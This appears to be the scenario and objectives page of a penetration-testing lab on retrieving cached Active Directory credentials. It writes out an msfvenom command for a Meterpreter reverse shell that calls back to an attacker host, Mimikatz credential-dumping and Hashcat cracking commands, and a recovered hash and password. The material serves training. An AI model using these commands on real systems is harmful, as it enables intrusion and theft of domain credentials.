# Exercise 11: Retrieving Cached Active Directory Credentials

### Scenario

**Retrieving Cached Active Directory Credentials** is a critical post-exploitation phase during an Active Directory security assessment. When a Windows system authenticates to an AD domain controller, MS-Cache (mscash/mscash2) hashes are stored locally in the registry SAM/SECURITY hives to enable offline logon capabilities. Attackers leverage initial access mechanisms (such as unauthenticated web file uploads and command injection vulnerabilities) to establish Metasploit Meterpreter reverse shells, stage enumeration tools (`PowerView.ps1`) and credential dumping utilities (`mimikatz.exe`), verify logon caching configuration (`CachedLogonsCount`), extract cached NTLM hashes, and crack them offline using GPU-accelerated tools like **Hashcat**.

In this exercise, we generate a 64-bit Windows Meterpreter executable using **msfvenom** (<font color="#ffd700"><b>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.177.18 LPORT=9999 -f exe -o reverse.exe</b></font>), discover an outdated Apache web application on **WIN2016** (<font color="#38bdf8"><b>192.168.177.16:8080</b></font>), exploit unauthenticated file upload and arbitrary command execution (`Send_Command.php`), trigger payload execution to obtain a Meterpreter reverse shell, upload `PowerView.ps1` and `mimikatz.exe`, inspect domain structure (<font color="#ffd700"><b>Get-NetForest</b></font>), verify registry logon cache configuration (`HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`), extract Administrator NTLM hash (<font color="#ffd700"><b>sekurlsa::logonPasswords</b></font>), crack hash (`92937945b518814341de3f726500d4ff`) using Hashcat mode 1000 with `rockyou.txt` (<font color="#ffd700"><b>hashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt</b></font>), recover plaintext password (<font color="#ff4d4d"><b>Pa$$w0rd</b></font>), and establish an RDP session via **Remmina** to the **2019DC** Domain Controller (<font color="#38bdf8"><b>192.168.177.19</b></font>).

### Objective

The objective of this lab is to help students learn how to:
- Generate Windows 64-bit reverse shell payload using <font color="#ffd700"><b>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.177.18 LPORT=9999 -f exe -o reverse.exe</b></font>
- Perform Nmap service detection scan on target server (<font color="#ffd700"><b>nmap -p- -sV 192.168.177.16</b></font>)
- Exploit unauthenticated web upload vulnerability on Apache HTTP server (port 8080)
- Leverage command injection vulnerability (`Send_Command.php`) to execute uploaded payload
- Catch reverse Meterpreter shell session using Metasploit `exploit/multi/handler`
- Transfer post-exploitation enumeration tools (`PowerView.ps1`, `mimikatz.exe`) to target host
- Enumerate Active Directory forest details using PowerView command <font color="#ffd700"><b>Get-NetForest</b></font>
- Query Windows registry cached logon count via <font color="#ffd700"><b>(Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon").CachedLogonsCount</b></font>
- Extract cached NTLM hashes using Mimikatz <font color="#ffd700"><b>sekurlsa::logonPasswords</b></font>
- Perform offline dictionary password cracking using Hashcat (<font color="#ffd700"><b>hashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt</b></font>)
- Recover Domain Administrator plaintext password: <font color="#ff4d4d"><b>Pa$$w0rd</b></font>
- Validate access by connecting to Domain Controller **2019DC** (<font color="#38bdf8"><b>192.168.177.19</b></font>) over RDP via Remmina
